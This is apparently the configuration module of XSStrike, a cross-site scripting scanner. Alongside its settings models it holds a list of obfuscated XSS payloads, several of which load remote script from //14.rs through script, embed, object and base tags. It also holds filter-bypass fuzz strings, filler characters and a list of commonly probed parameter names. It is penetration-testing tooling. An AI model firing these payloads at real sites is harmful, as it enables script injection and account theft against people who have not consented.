from pydantic import BaseModel, Field
from typing import Dict, List, Set, Optional, Any

class XSSConfig(BaseModel):
    """Configuration settings for XSStrike."""
    delay: int = 0
    threadCount: int = 10
    timeout: int = 10
    proxies: Dict[str, str] = {}
    cookies: Dict[str, str] = {}
    blindPayload: str = ""
    xsschecker: str = 'v3dm0s'
    minEfficiency: int = 90
    defaultEditor: str = 'nano'

class Finding(BaseModel):
    """Represents a single XSS finding."""
    url: str
    type: str  # Reflected, Stored, DOM
    payload: str
    parameter: Optional[str] = None
    confirmed: bool = False  # True if triggered in browser
    level: int = 1

class ScanContext(BaseModel):
    """Runtime context for the current scan session."""
    config: XSSConfig = Field(default_factory=XSSConfig)
    target: Optional[str] = None
    paramData: Any = None
    headers: Dict[str, str] = Field(default_factory=dict)
    checkedScripts: Set[str] = Field(default_factory=set)
    checkedForms: Dict[str, Any] = Field(default_factory=dict)
    definitions: Dict[str, Any] = Field(default_factory=dict)
    payloads: List[str] = Field(default_factory=list)
    findings: List[Finding] = Field(default_factory=list)
    encoding: Optional[Any] = None

# Legacy global variables (to be removed once all modules are refactored)
xsschecker = XSSConfig().xsschecker
blindPayload = XSSConfig().blindPayload
timeout = XSSConfig().timeout
threadCount = XSSConfig().threadCount
delay = XSSConfig().delay
proxies = XSSConfig().proxies
headers = {} # Default empty for legacy
payloads = [] # Default empty for legacy
globalVariables = {} # God object placeholder

# Constants (Legacy support or immutable definitions)
specialAttributes = ['srcdoc', 'src']
badTags = ('iframe', 'title', 'textarea', 'noembed', 'style', 'template', 'noscript')
tags = ('html', 'd3v', 'a', 'details')
jFillings = (';')
lFillings = ('', '%0dx')
eFillings = ('%09', '%0a', '%0d', '+')
fillings = ('%09', '%0a', '%0d', '/+/')

eventHandlers = {
    'ontoggle': ['details'],
    'onpointerenter': ['d3v', 'details', 'html', 'a'],
    'onmouseover': ['a', 'html', 'd3v']
}

functions = (
    '[8].find(confirm)', 'confirm()',
    '(confirm)()', 'co\u006efir\u006d()',
    '(prompt)``', 'a=prompt,a()')

default_payloads = [
    '\'"</Script><Html Onmouseover=(confirm)()//',
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confi\u0072m()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((pro\u006dpt))()//',
    '<iMg sRc=x:confirm`` oNlOad=e\u0076al(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//14.rs>',
    '<embed//sRc=//14.rs>',
    '<base href=//14.rs/><script src=/>',
    '<object//data=//14.rs>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=co\u006efirm&#x28;1&#x29>',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;co\u006efirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confir\u006d`1`>',
    '<svg/onload=co\u006efir\u006d`1`>'
]

fuzzes = (
    '<test', '<test//', '<test>', '<test x>', '<test x=y', '<test x=y//',
    '<test/oNxX=yYy//', '<test oNxX=yYy>', '<test onload=x', '<test/o%00nload=x',
    '<test sRc=xxx', '<test data=asa', '<test data=javascript:asa', '<svg x=y>',
    '<details x=y//', '<a href=x//', '<emBed x=y>', '<object x=y//', '<bGsOund sRc=x>',
    '<iSinDEx x=y//', '<aUdio x=y>', '<script x=y>', '<script//src=//', '">payload<br/attr="',
    '"-confirm``-"', '<test ONdBlcLicK=x>', '<test/oNcoNTeXtMenU=x>', '<test OndRAgOvEr=x>')

default_headers = {
    'User-Agent': '$',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip,deflate',
    'Connection': 'close',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1',
}

blindParams = [
    'redirect', 'redir', 'url', 'link', 'goto', 'debug', '_debug', 'test', 'get', 'index', 'src', 'source', 'file',
    'frame', 'config', 'new', 'old', 'var', 'rurl', 'return_to', '_return', 'returl', 'last', 'text', 'load', 'email',
    'mail', 'user', 'username', 'password', 'pass', 'passwd', 'first_name', 'last_name', 'back', 'href', 'ref', 'data', 'input',
    'out', 'net', 'host', 'address', 'code', 'auth', 'userid', 'auth_token', 'token', 'error', 'keyword', 'key', 'q', 'query', 'aid',
    'bid', 'cid', 'did', 'eid', 'fid', 'gid', 'hid', 'iid', 'jid', 'kid', 'lid', 'mid', 'nid', 'oid', 'pid', 'qid', 'rid', 'sid',
    'tid', 'uid', 'vid', 'wid', 'xid', 'yid', 'zid', 'cal', 'country', 'x', 'y', 'topic', 'title', 'head', 'higher', 'lower', 'width',
    'height', 'add', 'result', 'log', 'demo', 'example', 'message']
